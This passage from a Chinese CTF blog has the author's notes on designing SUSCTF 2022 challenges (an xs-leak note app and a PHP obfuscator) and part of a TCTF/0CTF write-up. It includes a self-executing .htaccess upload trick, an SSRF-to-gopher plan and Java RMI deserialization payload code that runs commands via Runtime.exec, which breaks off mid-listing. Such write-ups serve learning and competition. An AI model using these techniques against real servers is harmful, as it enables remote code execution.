<p>没有任何的难度，如果你仔细看了题目描述的话。。。PM的意思是private message，再翻译一下就是私聊。。。然后bot只会在challenge-checkin频道工作，但是还是有好多人在misc频道疯狂发<code>&gt;PM</code>之类的东西，麻了。我在里面反复提醒，大伙也不看历史记录，就憨憨的在里面狂发，感到无奈。。。</p>
<p>然后一血播报的话。赛宁也不给平台API逻辑，看了下L3H的师傅怎么写的，然后就硬猜API逻辑进行魔改，好像也勉强能用，大概就是给一个id就能查这个id后的事件，但公告总是会被查出来，然后正则一下就行，公告由于总是能被查出来扰乱我写的垃圾bot的逻辑，所以可能还是需要魔改一下。维护一个状态而不是就瞎记id</p>
<h2 id="ez-note"><a href="#ez-note" class="headerlink" title="ez_note"></a>ez_note</h2><p>这个题是很久以前看<a href="https://xsleaks.dev/">xs leak wiki</a>的时候觉得有的思路蛮不错的，然后就捡起来了一个开始写（前端垃圾还花了一个下午学bootstrap来写那个垃圾的前端）。</p>
<p>思路就是里面写的window.history.length，通过反复变换所在域最后取得访问权查看history长度来获取泄露出的只言片语。</p>
<p>这个攻击手法的实际利用并不是很现实，就我使用的Chrome而言，默认是阻止弹出窗口的，在实际攻击的情况下弹出窗口需要用户确认，且弹出窗口的攻击方式也非常明显，并且只能泄露出一位信息。只能拿到比赛里面玩一下了。。</p>
<p>题目上了一些buff，Samesite为lax，X-Frame-Option是same origin，CSP是unsafe-inline</p>
<h3 id="Samesite"><a href="#Samesite" class="headerlink" title="Samesite"></a>Samesite</h3><p>Chrome从80开始将未设定SameSite的cookie设定为lax（实际上是lax+POST，在cookie刚发下来的两分钟内可以通过POST表单发送，<a href="https://chromestatus.com/feature/5088147346030592">lax+POST</a>，这也是fxxkcors那题中允许POST进行ssrf的原因）。<br>这样子就已经能阻止绝大多数的攻击了，但lax cookie是允许在顶级导航改变且为GET方法时发出的，比如点击链接之类的，因此我们有几种方式来进行ssrf：1.用户点击href，bot未提供该功能；2.改变location，这个操作跳出去了也就没有后续了；3.GET表单提交，同2；4.window.open，唯一有可能的攻击点</p>
<h3 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h3><p>整了个unsafe-inline，主要是为了迷惑一下大家以为这是个XSS题，但实际上是为了给我的重定向js用的。不然写个nonce或者不设CSP也没问题。ejs输出都转义了，应该也不会出问题，就算出了问题，admin也看不见用户的note，确保绝对的安全。。。</p>
<h3 id="X-Frame-Option"><a href="#X-Frame-Option" class="headerlink" title="X-Frame-Option"></a>X-Frame-Option</h3><p>如果这个世界上存在一个我不知道的能让iframe带cookie的方法，那么这个题就会被简单的iframe.onload打穿，所以以防万一写了一句。</p>
<h3 id="跳转重定向"><a href="#跳转重定向" class="headerlink" title="跳转重定向"></a>跳转重定向</h3><p>说起来这里在一开始出题的时候，想过怎么样进行重定向来增加history又不留痕迹，一开始想的是直接302，但是发现直接302的重定向并不会在浏览器端留下history的增长，也试过header里面加一个refresh的延时跳转，也不行。一开始302没成功还以为是直接重定向了没算，然后header的refresh延时也没成，可能是因为refresh是直接变更url，导致history中的一项变化，并没有增加长度。最后只能尝试在前端进行跳转，然后为了掩人耳目，就给大部分的功能都加了一个前端跳转降低被发现的概率。当然我在题目描述处说了flag的格式，就已经很可疑了</p>
<h3 id="window-history"><a href="#window-history" class="headerlink" title="window.history"></a>window.history</h3><p>这个属性也蛮怪的，是一个记录了当前tab访问历史的数组。由于同源策略，无论是什么垃圾属性都不能随便的被跨域访问，所以这个属性当然也受保护。但就算是在同一个域，也只能通过pop等方法进行变更，并不能访问数组中每一项的值，顶多就是访问一个length属性。并且如果在当前tab开iframe，那么iframe的访问记录也会记录到当前tab的history里面。一开始出题的时候还考虑过要不要用iframe打，然后发现history长度大的一笔，最后才发现是iframe的访问也会记录到当前tab上。当然，最后因为无敌的samesite cookie，iframe肯定没戏</p>
<h3 id="samesite-same-origin"><a href="#samesite-same-origin" class="headerlink" title="samesite? same origin?"></a>samesite? same origin?</h3><p>这两个概念也有细微的差别，same origin是最严格的策略，就协议端口域名完全一致才叫same origin，而samesite则宽松许多。跨域访问收到same origin的限制，而cookie的安全属性为samesite，而只要eTLD+1相同，就被认为是samesite，即使他们的端口不同协议不同。因此当初我在一个其他端口上部署了环境，然后在另一个端口且换了个域名部署poc，结果发现samesite属性怎么调iframe都能打，差点感觉这个题凉了<br><a href="https://web.dev/i18n/en/same-site-same-origin/">Understanding “same-site” and “same-origin”</a><br>这么说来如果<code>eTLD+1</code>相同的两个站下一个存在xss，就可以无视SameSite的限制打一个任意的CSRF了</p>
<h3 id="auth头认证"><a href="#auth头认证" class="headerlink" title="auth头认证"></a>auth头认证</h3><p>一开始好像不是用的cookie，而是用的auth头，然后前后端分离，这样子的话在一定程度上防御了csrf，但是如果出现XSS就直接被打穿，并且来一手iframe包含感觉就又凉了，并且这样子就真的能被iframe打爆了。也许这就是我当初调了半天iframe攻击手法的原因？</p>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>完整代码放到GitHub上去了 <a href="https://github.com/Z3ratu1/my_ctf_challenge/tree/main/SUSCTF2022/bot">bot</a><br>这个地方，坑踩了蛮多。。。一开始只写了这个题的bot，后来就着把fxxkcors的bot整合到一起了，就单独写了个项目，也挺破烂的呜呜<br>bot用的是nodejs的puppeteer库，好像是谷歌官方开发的？支持蛮好，并且稳定性不错（才怪，一堆内存泄漏），比祖传的Python bot稳定一些。在windows上可以很轻松的跑起来，因为我本身就装了全套的Chrome。放到docker上全是bug。。。大概意思就是缺这缺那，去trouble shooting那找到了全依赖，然后一个个试把需要的依赖给都翻了出来</p>
<p><strong>该库在打开page并关闭后可能出现内存泄漏，正确的处理方案是先goto about:blank再关闭</strong>，即使这样eznote的bot也被反复打碎，可能是因为xs leak开一万个tab，师傅们不手动关我直接销毁浏览器可能还是会泄漏。总而言之，虽然不会随便整个崩溃退出，但内存泄漏问题略微严重</p>
<p>然后前段时间不是出了个Chrome bot的RCE嘛，bot在docker下以root身份运行的时候不能启动sandbox，被打就直接打穿了，那就得想办法启动一下sandbox，谨防RCE。<br>然后启动sandbox也存在一系列的坑，首先root不能启动sandbox，所以要加用户，然后sandbox本身使用的是Linux的user namespace，需要宿主机内核的额外支持，需要启动一下<code>sysctl -w kernel.unprivileged_userns_clone=1</code>，虽然好像默认都是启动的。最后在docker run的时候还需赋予额外特权<code>--cap-add SYS_ADMIN</code>。反而给了docker更大的权利。。。不过我这下运行bot的用户是一个低权限的+sandbox的用户，理论上打不穿了吧。</p>
<p>因为智力条件有限，bot的低权限用户还是敲了一堆命令然后写一个sh脚本su过去启动的，后来发现Dockerfile有一个USER命令，直接切换用户。。。以及安装以来的时候请使用yarn而不是垃圾的npm，当初用npm下依赖build一次就要十分钟</p>
<h3 id="防止非预期的一些工作"><a href="#防止非预期的一些工作" class="headerlink" title="防止非预期的一些工作"></a>防止非预期的一些工作</h3><p>因为想打的是window.history，而不是onload之类的事件，所以要确保不会出现什么能对window.open打开的window进行跨域监听之类的操作，因为img之类的是可以跨域监听onload的嘛，进行了一些简单的搜索，确保并未存在这种手法<br><a href="https://javascript.info/cross-window-communication">Cross-window communication</a><br><a href="https://javascript.info/popup-windows">Popups and window methods</a><br><a href="https://stackoverflow.com/questions/3030859/detecting-the-onload-event-of-a-window-opened-with-window-open">Detecting the onload event of a window opened with window.open</a></p>
<h3 id="一些吐槽"><a href="#一些吐槽" class="headerlink" title="一些吐槽"></a>一些吐槽</h3><p>这个题由于限制的足够死所以就这一个解法，没什么岔子，但是由于xsleak需要一位一位的注，所以显得有点繁琐，我为此缩短了flag的长度，并且把谷歌recaptcha的安全度调到最友好，即使这样也被反馈了把把都要做验证码了。。。好吧我的<br>其实一开始的方案是自己写验证码的，后来打了dicectf发现他们用的谷歌的，感觉还挺好用的，又省心又靠谱，就抄了</p>
<p>有一个师傅吐槽要点几百遍。。。我的意见是一次多开点tab，为此我专门申请了三个2c4g的机子当bot来分担压力</p>
<h2 id="rubbish-maker"><a href="#rubbish-maker" class="headerlink" title="rubbish maker"></a>rubbish maker</h2><p>这个的一开始的思路应该是看了zsx神仙的文章？不知道什么时候就有一点这个想法了<br><a href="https://blog.zsxsoft.com/post/42">开发简单的PHP混淆器与解混淆器</a></p>
<p>然后又连续经历了两次究极反序列化找链，第一个可能就是zsx出的？给一万个垃圾类然后找到一条反序列化链。第二个是SCTF上强化了一点的，加了魔法方法，但因为些题模式较为单一，基本上大家都是用正则匹配黑魔法+路径搜索算法做出来的。所以我就想写一个不能用正则黑魔法完成的赛题</p>
<p>使用的也是zsx神仙提到的开源语法库，PHP-Parser。</p>
<p>然后稍微详细描述一下这几个类的意义吧</p>
<h3 id="NameObfuscator"><a href="#NameObfuscator" class="headerlink" title="NameObfuscator"></a>NameObfuscator</h3><p>这个很简单，就是把变量名，label的标签名之类的替换一下。随便生成一个随机字符串，一开始生成的直接是全不可见字符，还判断了是否存在重复的字符串以防出现问题。后来想了一下算了做个人，就改成了a-zA-Z了。然后还把判断是否重复的代码给注释了。。。但是8的长度理论上也不会出这个问题，相信自己.jpg</p>
<p>然后记住下划线开头的变量不能动，不然就出事了</p>
<h3 id="ScalarObfuscator"><a href="#ScalarObfuscator" class="headerlink" title="ScalarObfuscator"></a>ScalarObfuscator</h3><p>这个也没什么好说的<br>就简单的替换之类的东西，很垃圾，把数字做几个运算，或者把字符串base64套几下，属于那种正则都能做的东西，也没什么可注意的点，就是能别让我的意图提现的过于明显</p>
<h3 id="LogicShuffler"><a href="#LogicShuffler" class="headerlink" title="LogicShuffler"></a>LogicShuffler</h3><p>我觉得写到这应该是不能再用黑魔法来解了吧<br>将所有的语句打乱，将整个运行逻辑变为运行一句goto一下，再把goto的顺序也扰乱，使得跟踪代码也变得复杂。当然，如果只是追踪goto的话，也可以强行正则，因此我添加了一点混淆。<br>增加了一些额外的无效goto语句，主要作用是goto到之前的label处造成无限循环，因为混淆器不能破坏代码的原有逻辑，所以实际上那些GET一个啥再goto之类的if在原有逻辑中没有，那么就全是假的。当然，做题的时候并不能判断原来有没有，不过还是可以从goto跳回原来的label来对其进行删减。</p>
<p>这里造成了一点点的问题。混淆器不能破坏源代码的逻辑，因此我增加的goto在正常使用的情况下是不会出现问题的，但可以通过精心构造的方法使得其反复执行原来的代码，从而导致原本一些本身无法通过的逻辑通过。switch表达式中有一个eval本身按照正常逻辑是无法调用的，但通过goto回溯之后反而能被成功赋值并进行代码执行了。。。当然这也是个概率事件，但确实有师傅完成了利用，这让我感到有点不可思议，算是一个意料之外的非预期</p>
<p>也有很多师傅恢复到这步后直接能看到我的各种反调试代码，然后把反调试代码删了之后上调试器调试得到了逻辑获取了flag</p>
<h3 id="ControlFlowFlattener"><a href="#ControlFlowFlattener" class="headerlink" title="ControlFlowFlattener"></a>ControlFlowFlattener</h3><p>Chinglish，意为控制流平台化器。主要的功能就是收集所有的字符串函数调用等内容，打包到一个函数里面，然后通过key的方法来获取返回值，同样做了goto的打乱，key是由两个随机生成的字符串异或而成的，增大了还原的难度（再次禁止正则黑魔法），并且将二元操作符全部提取出来，以匿名函数的形式返回。这里倒是不怎么好写正则，我看许多师傅这里正则就写不动了</p>
<p>以及这是一个类似于控制流平坦化的操作，如果不做的话简单的调试也许能定位到反调试代码的位置注释掉从而完成调试，这里使得调用变得极其繁琐且难以调试，防止上来就debug给我秒了</p>
<p>但是因为只是简单的函数调用，所以师傅们还是有非常高妙的解法。我看到的基本上都是把这个函数单独拎出来，然后正则匹配函数调用的参数，放进函数运行得到返回值并替换回去。。。。到最后怎么又回到正则表达式了呜呜<br>但是不得不说这个解法非常的巧妙，唯一的缺点就是返回匿名函数的时候不好处理，感觉不如….语法分析</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>我以编写混淆器逻辑的上帝视角以同样的逻辑编写了反混淆器。代码在最开始的链接里</p>
<h2 id="一些废案"><a href="#一些废案" class="headerlink" title="一些废案"></a>一些废案</h2><p>一些当初觉得也许能用但没用起来的废案</p>
<h3 id="windows下的cgi与htaccess"><a href="#windows下的cgi与htaccess" class="headerlink" title="windows下的cgi与htaccess"></a>windows下的cgi与htaccess</h3><p>这个是带大一萌新的时候教htaccess的时候发现的问题。简单的说就是当初在教文件上传，然后大家用的phpstudy急速搭建的环境，有人就和我反应说htaccess传了打不通。还给我发了这么一段话</p>
<blockquote>
<p>简单来说TS版本的PHP是更适合与Apache配套使用的(虽然NTS版本也能用但是多少有些不足)，如果我们想使用在前面说的那些Apache设置指令就需要使用TS版本的PHP，但不幸的是PHPStudy中提供的均是NTS版本的PHP，并且网上关于Apache设置指令的修改教程均是对于TS版本的PHP适用的(NTS貌似改不了?确实找不到相关文章)，这就导致了我们对着自己PHPStudy中的Apache配置各种更改但均不见效。</p>
</blockquote>
<p>果真如此吗（真的吗，我不信.jpg），然后写了个demo放进nts的PHP里试了一下</p>
<pre><code>&lt;Files ~ &quot;\.htaccess&quot;&gt;
    Require all granted
    Order deny,allow
    Allow from all
    SetHandler application/x-httpd-php
&lt;/Files&gt;
# &lt;?php phpinfo(); ?&gt;
</code></pre>
<p>真跑不起来，改成ts的就行了</p>
<p>理论上不该如此，Apache的配置和PHP的版本应该没有区别啊？那篇文章中有提到，可以通过修改配置的方法让nts也能用起来，看看phpstudy在切换版本时有没有修改什么配置？<br>启动rmb神仙给的最新玩具，procmon，监控phpstudy.exe，限制范围在Apache目录。切换版本，启动！只有conf&#x2F;extra&#x2F;httpd-php.conf改了，看看前后区别</p>
<p>ts版的如下</p>
<pre><code>LoadFile &quot;D:/phpStudy/PHPTutorial/php/php-5.5.38/php5ts.dll&quot;
LoadModule php5_module &quot;D:/phpStudy/PHPTutorial/php/php-5.5.38/php5apache2_4.dll&quot;
&lt;IfModule php5_module&gt;
PHPIniDir &quot;D:/phpStudy/PHPTutorial/php/php-5.5.38/&quot;
&lt;/IfModule&gt;
LoadFile &quot;D:/phpStudy/PHPTutorial/php/php-5.5.38/libssh2.dll&quot;
&lt;FilesMatch &quot;\.php$&quot;&gt;
    SetHandler application/x-httpd-php
&lt;/FilesMatch&gt;
</code></pre>
<p>nts版的如下</p>
<pre><code>LoadModule fcgid_module modules/mod_fcgid.so
&lt;IfModule fcgid_module&gt;
Include conf/extra/httpd-fcgid.conf
FcgidInitialEnv PHPRC &quot;D:/phpStudy/PHPTutorial/php/php-5.6.27-nts/&quot;
AddHandler fcgid-script .php
FcgidWrapper &quot;D:/phpStudy/PHPTutorial/php/php-5.6.27-nts/php-cgi.exe&quot; .php
&lt;/IfModule&gt;
</code></pre>
<p>才发现原来是fastcgi模式下需要进行额外的配置（这样子是不是显得我挺蠢的。。。），将htaccess修改成如下内容</p>
<pre><code>&lt;Files ~ &quot;\.htaccess&quot;&gt;
    Require all granted
    Order deny,allow
    Allow from all
    SetHandler fcgid-script
    FcgidWrapper &quot;D:/phpStudy/PHPTutorial/php/php-5.6.27-nts/php-cgi.exe&quot; .htaccess
&lt;/Files&gt;
# &lt;?php phpinfo(); ?&gt;
</code></pre>
<p>这样子就打得通了，也就是说，SetHandler等关键字并不是在nts下无法使用，而是其使用的handler在Apache对PHP的不同模式下并不一致，在对应的模式需要使用对应的值，即可完成对其他文件的解析</p>
<p>然后简单搜索一下发现网络上好像没有什么关于这个的描述，并且经过测试这里可以使用Windows下的路径通配符，本来准备把这个出成一个题的，结果后来随手搜了一个htaccess的利用，发现第一篇文章就提到了这个点，放弃了。。。呜呜</p>
<p>说到底是因为nts版本基本上都不会作为服务使用，而是作为cli使用，所以这个配置就并不常见。但既然能在非常显眼的地方发现，就放弃了。并且windows环境和权限控制也完全不会，万一被奇怪的东西打到非预期或者被搅屎就不好了。。。</p>
<h3 id="垃圾代码的衍生物"><a href="#垃圾代码的衍生物" class="headerlink" title="垃圾代码的衍生物"></a>垃圾代码的衍生物</h3><p>写eznote的时候写的垃圾代码，以及前两个星期RWCTF的非预期，拼拼凑凑有一点思路，但是比赛前几天在调试之前题目别出非预期，赛时两天当了两天每天15h的全职客服，就没写出来了呜呜</p>
<p>大概的几个想法就是。RWCTF中出题人在回调函数中return，以为是return了当前路由，实际上并没有（我一开始也完全没看出来是在回调里面return了）</p>
<p>然后是写垃圾代码的时候发现了next和return next的区别</p>
<p>其次是res.send()&#x2F;end()等函数并不会结束当前中间件的处理，只是会结束对这个http交互的处理，但似乎会使得不再前往下一个中间件。但如果我显式的调用next呢。估计又会了，本来想做一个签到，就专打直觉之类的，可惜没写出来</p>
<p>（说起来fxxkcors那个打法，当初EVat0m师傅说他发现的时候也没看见有类似的文章，结果那个时候一搜又搜出来有现成打法了，那就。。。当个签到题吧）</p>
<h3 id="tar-phar反序列化"><a href="#tar-phar反序列化" class="headerlink" title="tar phar反序列化"></a>tar phar反序列化</h3><p>忘了在哪场比赛看到的了，就是tar这个文件结构非常松散，所以在有大量杂数据的情况下也可以非常完美的解析。那场比赛中的是能写一个.log，然后有大量的废数据，就是通过tar+phar反序列化打的，因为其极其强大的容错性。</p>
<p>然后我就想能不能写一个upload progress+tar完成反序列化呢？因为upload progress就会出现废数据，因此就有考zip协议等各种协议方式进行绕过并利用的，那么如果我用tar来魔改upload progress并利用phar反序列化是不是也能实现呢。这样子就连写文件的点也不需要了<br>简单的试了一下，upload progress确实能捏出来一个符合tar标准的数据，也能被反序列化，但这里有一个非常奇怪的问题。PHP的phar协议认为phar文件必须有一个后缀名。。。不能像zip或者jar之类的用一个字符作为分隔符，phar认为有后缀名的文件才能被认为是phar文件。。。为此我搜索了一堆东西，也翻了PHP源码，发现他的处理真的就是这么的离谱，既没有分隔符之类的字符，也必须要求有一个后缀，计划破产。。。</p>
<h2 id="学到的东西？"><a href="#学到的东西？" class="headerlink" title="学到的东西？"></a>学到的东西？</h2><p>当了两天英语客服，导致接下来的一天说话总是会联想英文怎么说，朋友跑来问我问题我打开键盘第一反应是说英文，麻了。</p>
<p>然后docker的定时重启，我一开始是交给赛宁的师傅去做的，本来以为是高端技巧，结果发现是crontab里面写一个restart。。。<br>行吧，但是我想要的重启肯定是把容器删了重建清空数据，然后就写了两个定时任务，一个删一个建，发现完全跑不起来，思考一下感觉应该是关的速度不够快，而还没关掉就开始建的话端口占用就挂了，合并成一个任务就行。</p>
<p>然后抗压能力upup，比赛结束的时候因为misc质量不行被两个暴躁老哥在问卷里从头骂到尾，抑郁了。呜呜。然后出去散了散吃了顿又活了，也有很多师傅给与了肯定和鼓励，活了。</p>
<p>然后垃圾英语口语又变好了一点点？算了吧，Chinglish也被师傅们嘲笑了呜呜。然后还遇到几个很有意思的外国老哥，虽然没怎么聊天但也觉得人还不错呢</p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>TCTF/0CTF</title>
    <url>/TCTF.html</url>
    <content><![CDATA[<h1 id="TCTF-x2F-0CTF"><a href="#TCTF-x2F-0CTF" class="headerlink" title="TCTF&#x2F;0CTF"></a>TCTF&#x2F;0CTF</h1><p>至尊难，认认真真搞了一天一个题都做不出来，虽然做出来题的队伍不多，但是我还是太垃圾了呜呜</p>
<p>赛后复现了2rm1，其中绝大多数的代码都是参考的rmb神仙，还超级提问麻烦了他几天，表示感谢</p>
<h2 id="1linephp"><a href="#1linephp" class="headerlink" title="1linephp"></a>1linephp</h2><p>搜了一下发现了orange在18年给hitcon出的题目<br><a href="https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html">HITCON CTF 2018 - One Line PHP Challenge</a><br>唯一的差距就是把之前无限制的文件名加了一个.php后缀。难度提升</p>
<p>给了phpinfo，简单看了看没发现什么特殊点，感觉和default的差不多，upload progress开着，可以考虑用这个打一波<br>orange的题目是没有后缀限制所以可以直接upload progress包含对应的文件，phpinfo里面开了url_fopen，但是没开url_include，远程包含全部木大<br>本地包含我只能想到upload progress，然后PHP后缀只能拿zip或者phar这里打包的协议来绕</p>
<p>但问题和orange这个题是一样的，session中会自带垃圾数据，不论是phar还是zip都会被垃圾数据影响从而无法解析，orange可以用filter反复base64decode把所有垃圾数据清理，我尝试重复这样的操作，却发现zip协议和phar协议并不能在里面再套一层php:&#x2F;&#x2F;filter。计划破产<br>试了试把resource放到前面，过滤器放到后面，也不行，呜呜<br>改了改php.ini的upload progress cleanup想拿到一个upload progress的文件看一眼，但是不知道为什么没成功，为此浪费了好久。。。并且阿里云的机子想跑payload经常会因为奇怪的原因把我ban了，还是虚拟机好用。。。然后转到虚拟机，物理机能ping通虚拟机但是访问不上页面是什么玩意呢。怎么坑越踩越多，崩了崩了</p>
<p><strong>update:</strong> 好了，虚拟机修好了，虚拟机ping的通访问不上，且虚拟机内能通过自己局域网ip访问到自己，99%是防火墙的问题，Ubuntu一般来说防火墙叫ufw，那个东西已经被我持续长久的关掉了，但是这次不知道是从哪又冒出来一个firewalld，搜了半天发现是这么个玩意，关了之后瞬间通</p>
<h3 id="看wp"><a href="#看wp" class="headerlink" title="看wp"></a>看wp</h3><p>又到了我最喜欢的看wp环节，出题人的官方wp已经出来辣，虽然在这之前已经和CNSS的好姐姐进行了一波交流，得知了她的一个解，今天wp出来发现那是一个非预期，真是太强了呜呜，我太垃圾了<br>然后尝试着去硬看PHP源码，结果发现PHP源码调的是libc的库，然后libc的库没看就看不懂了，暂时告一段落</p>
<p>预期解是利用了libc对zip的解析方式，通过修改zip格式来实现解析，而非预期同样用一个比较简单的方式解决了这个问题，总而言之，一开始的思路是正确的，可惜的是我没有把握是不是一定对而没有过多的深究，思考的方向也不在解析上，呜呜呜，其实从一开始似乎就是在正确的道路上啊<br>出题人的wp</p>
<p><a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2021/1linephp/writeup">1linephp_writeup</a></p>
<h2 id="2rm1"><a href="#2rm1" class="headerlink" title="2rm1"></a>2rm1</h2><p>是个java题，出于实在不知道该干什么而尝试进行java入门看的。能看出来应该是打一个RMI 反序列化。<br>给了三个部分，Server，Client，还有一个spider，翻翻docker-compose.yml，spider是我们可以访问到的，接受一个url，用<code>curl -L</code>发请求，并且输入的url必须以<code>https://</code>开头，server和client在内网里面，server本身也是registry，flag在client上<br>spider和client用spring boot起的web服务，可以接受get提交的参数发送对应的请求。<br>client和server的主要代码就是一套经典的RMI模板，并且之间传的参数也都是string，似乎不能直接反序列化，但是之前有看seebug一篇文章上将可以通过java agent或者其他的注入方法，将序列化的数据替换，也能实现传参基本类型的情况下完成反序列化</p>
<h3 id="奇怪的前置知识"><a href="#奇怪的前置知识" class="headerlink" title="奇怪的前置知识"></a>奇怪的前置知识</h3><p>docker-compose中每个docker的那个名字就是docker在环境里的主机名，一开始我还以为要用spider去猜，而docker网桥的内网环境ip地址段较为固定，可以通过穷举去猜测。然后rmb告诉我那个就是主机名，远程通信的时候直接填这个主机名就可以了。。。呜呜呜我真不知道，我是废物</p>
<h3 id="curl-ssrf"><a href="#curl-ssrf" class="headerlink" title="curl ssrf"></a>curl ssrf</h3><p><code>man curl</code>翻了翻-L这个参数是干什么的，发现就是支持重定向。那这个意图也太明显了<br>肯定是先curl访问https然后重定向打内网ssrf<br>可以直接ssrf client，让client调用server的hello方法，但是没什么用。<br>考虑一下ssrf时还有一个常用的协议，gopher，通过发送原生tcp流就能通过巧妙的构造进行任意协议的发送<br>经过测试发现原来curl支持重定向的时候，连协议都能进行改变。因此可以直接在vps上放一个重定向然后直接打gopher协议</p>
<p>因为RMI调用和HTTP协议差不多，之间并没有先握手再通信之类的交互过程，就是用户发一个包服务器回一个包，所以能够用gopher简单的发原始tcp流量进行攻击。</p>
<h3 id="攻击server"><a href="#攻击server" class="headerlink" title="攻击server"></a>攻击server</h3><p>简单看一下dockerfile内容，发现Spider的jdk版本很高，而server和client均为jkd8u232，似乎刚好是registry拉满防御的那一个版本，因此并不能通过打registry来完成攻击<br>但是server和registry是同一台机器，可以考虑通过攻击server来控制目标主机。server只提供了一个以String为参数的方法供使用，因此不能简单地进行攻击，但对于接受非基本类型参数的方法的攻击在网络上已经出现了很多文章了，可以通过魔改代码等方式在接收类是非基本类型的时候硬发一个Object上去反序列化，而对于String的过滤是jdk8u242，因此这里的版本刚好能用。</p>
<p>抄了出题人的工具，把AttackServerByNonPrimitiveParameter中的payload直接魔改成这个题里面的gadget</p>
<h4 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h4><p>题目的gadget</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>yxxx<span class="token punctuation">;</span>

<span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>InvocationHandler<span class="token punctuation">;</span>
<span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Gadget</span> <span class="token keyword">implements</span> <span class="token class-name">InvocationHandler</span><span class="token punctuation">,</span> Serializable <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token function">Gadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> Object <span class="token function">invoke</span><span class="token punctuation">(</span>Object proxy<span class="token punctuation">,</span> Method method<span class="token punctuation">,</span> Object<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            var5<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">return</span> null<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>实现了InvocationHandler，且有一个invoke方法，可以把这个类作为一个代理类使用，而这里这个代理函数的效果就是无论你调用啥方法我都直接拿着你第一个参数exec</p>
<p>由于完全没有积累，并不知道怎么去摸出来一个反序列化过程能进行一个调用操作，这里抄rmb神仙的wp</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> Object <span class="token function">genePayload</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> cmd<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">try</span> <span class="token punctuation">{</span>
        Comparator c <span class="token operator">=</span> <span class="token punctuation">(</span>Comparator<span class="token punctuation">)</span>
                Proxy<span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>test<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>Comparator<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">com<span class="token punctuation">.</span>yxxx<span class="token punctuation">.</span>Gadget</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        PriorityQueue pq <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Comparator</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span>Object o<span class="token punctuation">,</span> Object t1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        pq<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Field field <span class="token operator">=</span> pq<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"comparator"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
